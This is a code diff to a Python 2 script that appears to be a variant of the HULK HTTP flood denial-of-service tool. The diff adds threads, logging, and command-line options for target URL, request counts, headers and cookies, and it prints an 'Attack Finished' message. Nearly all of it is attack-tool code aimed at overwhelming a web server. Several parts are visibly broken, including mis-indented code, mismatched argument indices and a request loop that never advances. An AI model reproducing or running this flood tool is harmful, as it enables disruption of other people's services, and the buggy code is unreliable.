@@ -3,6 +3,7 @@ import sys
 import threading
 import random
 import re
+import logging
 
 url = ''
 param = ''
@@ -10,16 +11,18 @@ header = {}
 cookies = ''
 local = threading.local()
 request_counter = 1
-total_counter = 0
-thread_counter = 0
+thread_counter = 1
+run_counter = 1
 lock = threading.Lock()
+logger = logging.getLogger('mylogger')
 
 
 def inc_counter():
-    global request_counter
-    request_counter+=1
+    global run_counter
+    run_counter+=1
 
 def httpcall():
+    code = 0
     try:
       cookieHandle = urllib2.HTTPCookieProcessor()
       opener = urllib2.build_opener(cookieHandle)
@@ -32,8 +35,8 @@ def httpcall():
           request = urllib2.Request(url)
           response = urllib2.urlopen(request)
           body = opener.read()
+          logging.info(body)
     except urllib2.HTTPError, e:
-      #print e.code
       local.fail+=1
       print 'Response Code 500'
       code=500
@@ -58,16 +61,26 @@ def addCookie(cookies,opener):
 
 # def data(url,param,header,cookies):
 def data():
+    global url 
+    global param
+    global header
+    global cookies
+    global thread_counter
+    global request_counter
     if len(sys.argv) < 3:
       sys.exit()
     else:
       url = sys.argv[2]
       if len(sys.argv)== 3:
-          param = sys.argv[3]
+          thread_counter = sys.argv[3]
       if len(sys.argv)==4:
-          header = sys.argv[4]
+          request_counter = sys.argv[4]
       if len(sys.argv)==5:
-          cookies = sys.argv[5]
+          param = sys.argv[5]
+      if len(sys.argv)==6:
+          header = sys.argv[6]
+      if len(sys.argv)==7:
+          cookies = sys.argv[7]
 def set_url(purl):
     global url
     m = re.search('http\://([^/]*)/?.*', purl)
@@ -94,13 +107,14 @@ def set_thread_counter(pthread_count):
 class MonitorThread(threading.Thread):
     def run(self):
       previous = request_counter
-      while flag==0 :
+      total_counter = request_counter * thread_counter
+      while True :
         # print("request_counter:%d total_counter:%d"%(request_counter,total_counter))
         if (previous+100<request_counter) and (previous!=request_counter):
            print("%d Requests Sent"%request_counter)
            previous=request_counter
         #批量把global中的data进行转移，并且进行log
-        if request_counter == total_counter:
+        if run_counter == total_counter:
            print "\n-- HULK Attack Finished --"
            print("success:%s"%success)
            print("fail:%s"%fail)
@@ -109,34 +123,38 @@ class MonitorThread(threading.Thread):
 
 class HTTPThread(threading.Thread):
     def run(self):
+      count = 0
+      success = 0 
+      fail = 0
       try:
-        count = 0
-        # print("flag:%d count:%d thread_counter:%d"%(flag,count,thread_counter))
-        while count<thread_counter:
-          # print"test"
+        # print("flag:%d count:%d thread_counter:%d"%(flag,count,request_counter))
+        while count<request_counter:
             code = httpcall()
-            if count<100: 
-              if lock.acquire():
-                  #把local.data的值复制给global的data
-                
         if lock.acquire():
            #线程结束，统计成功失败
-
-          # if (code==500) :
-          #   set_flag(2)
+           success = success + local.success
+           fail = fail + local.fail
+           print("success:%d fail%d"%(success,fail))
+           lock.release()
       except Exception, e:
         raise
 
 def main():
+  log()
+  data()
   global thread_counter
-  global total_counter
-  thread_counter = 10
-  total_counter = 100
-  for i in range(10):
+  for i in range(thread_counter):
       t = HTTPThread()
       t.start()
-  t = MonitorThread()
-  t.start()
+  # t = MonitorThread()
+  # t.start()
+
+def log():
+   global logger
+    logger.setLevel(logging.DEBUG)
+    fh = logging.FileHandler('test.log')
+    fh.setLevel(logging.DEBUG)
+    logger.addHandler(fh)
 
 if __name__ == '__main__':
   main()
